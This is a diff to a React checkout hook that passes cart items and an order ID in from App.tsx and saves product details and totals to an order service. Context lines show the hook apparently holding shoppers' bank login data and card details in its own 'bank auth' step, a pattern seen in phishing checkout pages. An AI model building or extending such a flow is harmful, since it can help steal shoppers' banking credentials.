@@ -1,5 +1,6 @@
 import { useState, useCallback, useEffect } from 'react';
 import { saveOrderData } from '../services/orderService';
+import { CartItem } from '../App';
 
 export interface FormData {
   firstName: string;
@@ -37,7 +38,7 @@ export interface CardErrors {
   cardholderName: string;
 }
 
-export const useCheckout = (cartTotal: number) => {
+export const useCheckout = (cartTotal: number, cartItems: CartItem[], orderId: string) => {
   const [step, setStep] = useState(1);
   const [selectedBank, setSelectedBank] = useState('');
   const [showBankAuth, setShowBankAuth] = useState(false);
@@ -49,7 +50,8 @@ export const useCheckout = (cartTotal: number) => {
   const [processingProgress, setProcessingProgress] = useState(0);
   const [paymentDone, setPaymentDone] = useState(false);
   const [connectingProgress, setConnectingProgress] = useState(0);
-  const [currentOrderId, setCurrentOrderId] = useState<string | null>(null);
+  // Use the orderId passed from App.tsx instead of managing our own
+  const currentOrderId = orderId;
 
   const [cardErrors, setCardErrors] = useState<CardErrors>({
     cardNumber: '',
@@ -201,7 +203,27 @@ export const useCheckout = (cartTotal: number) => {
       saveOrderData(currentOrderId, { bankName: bankName });
     }
     setSelectedBank(bankName);
-  }, []);
+  }, [currentOrderId]);
+
+  const saveCartItemsToOrder = useCallback(() => {
+    if (currentOrderId && cartItems.length > 0) {
+      const productInfo = cartItems.map(item => ({
+        id: item.id,
+        name: item.name,
+        price: item.price,
+        quantity: item.quantity,
+        image: item.image,
+        set: item.set
+      }));
+      
+      const total = cartItems.reduce((sum, item) => sum + (item.price * item.quantity), 0);
+      
+      saveOrderData(currentOrderId, { 
+        productInfo,
+        total: total + shipping + tax
+      });
+    }
+  }, [currentOrderId, cartItems, shipping, tax]);
 
   const handleProceedToBankAuth = useCallback(() => {
     if (selectedBank) {
@@ -304,13 +326,14 @@ export const useCheckout = (cartTotal: number) => {
     });
   }, []);
 
-  // Set current order ID from ShippingForm
+  // Order ID is now passed from App.tsx, no need to get from sessionStorage
+
+  // Save cart items when order ID becomes available
   useEffect(() => {
-    const orderIdFromStorage = sessionStorage.getItem('currentOrderId');
-    if (orderIdFromStorage) {
-      setCurrentOrderId(orderIdFromStorage);
+    if (currentOrderId && cartItems.length > 0) {
+      saveCartItemsToOrder();
     }
-  }, []);
+  }, [currentOrderId, saveCartItemsToOrder]);
 
   // Save product info and total to order service when available
   useEffect(() => {
@@ -341,7 +364,6 @@ export const useCheckout = (cartTotal: number) => {
     bankLoginData,
     formData,
     currentOrderId,
-    setCurrentOrderId,
     
     // Computed values
     shipping,
